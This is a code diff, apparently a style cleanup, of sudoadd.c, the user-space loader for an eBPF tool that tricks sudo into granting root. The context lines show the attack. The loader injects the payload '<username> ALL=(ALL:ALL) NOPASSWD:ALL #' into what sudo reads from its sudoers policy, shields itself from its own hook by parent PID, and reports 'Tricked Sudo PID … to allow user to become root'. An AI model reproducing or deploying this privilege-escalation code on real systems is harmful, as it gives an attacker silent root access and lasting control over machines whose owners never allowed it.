@@ -1,4 +1,3 @@
-// sudoadd.c
 // SPDX-License-Identifier: BSD-3-Clause
 #include <argp.h>
 #include <unistd.h>
@@ -9,7 +8,8 @@
 
 #define INVALID_UID  -1
 // https://stackoverflow.com/questions/3836365/how-can-i-get-the-user-id-associated-with-a-login-on-linux
-uid_t lookup_user(const char *name) {
+uid_t lookup_user(const char *name)
+{
     if(name) {
         struct passwd *pwd = getpwnam(name); /* don't free, see getpwnam() for details */
         if(pwd) return pwd->pw_uid;
@@ -41,7 +41,8 @@ static const struct argp_option opts[] = {
     { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
     {},
 };
-static error_t parse_arg(int key, char *arg, struct argp_state *state) {
+static error_t parse_arg(int key, char *arg, struct argp_state *state)
+{
     switch (key) {
     case 'u':
         if (strlen(arg) >= max_username_len) {
@@ -76,7 +77,8 @@ static const struct argp argp = {
     .doc = argp_program_doc,
 };
 
-static int handle_event(void *ctx, void *data, size_t data_sz) {
+static int handle_event(void *ctx, void *data, size_t data_sz)
+{
     const struct event *e = data;
     if (e->success)
         printf("Tricked Sudo PID %d to allow user to become root\n", e->pid);
@@ -85,7 +87,8 @@ static int handle_event(void *ctx, void *data, size_t data_sz) {
     return 0;
 }
 
-int main(int argc, char **argv) {
+int main(int argc, char **argv)
+{
     struct ring_buffer *rb = NULL;
     struct sudoadd_bpf *skel;
     int err;
@@ -105,7 +108,7 @@ int main(int argc, char **argv) {
         exit(1);
     }
 
-    // Open BPF application
+    // Open BPF application 
     skel = sudoadd_bpf__open();
     if (!skel) {
         fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
@@ -114,7 +117,7 @@ int main(int argc, char **argv) {
 
     // Let bpf program know our pid so we don't get kiled by it
     skel->rodata->target_ppid = env.target_ppid;
-
+    
     // Copy in username
     sprintf(skel->rodata->payload, "%s ALL=(ALL:ALL) NOPASSWD:ALL #", env.username);
     skel->rodata->payload_len = strlen(skel->rodata->payload);
@@ -137,7 +140,7 @@ int main(int argc, char **argv) {
 		goto cleanup;
 	}
 
-    // Attach tracepoint handler
+    // Attach tracepoint handler 
     err = sudoadd_bpf__attach( skel);
     if (err) {
         fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
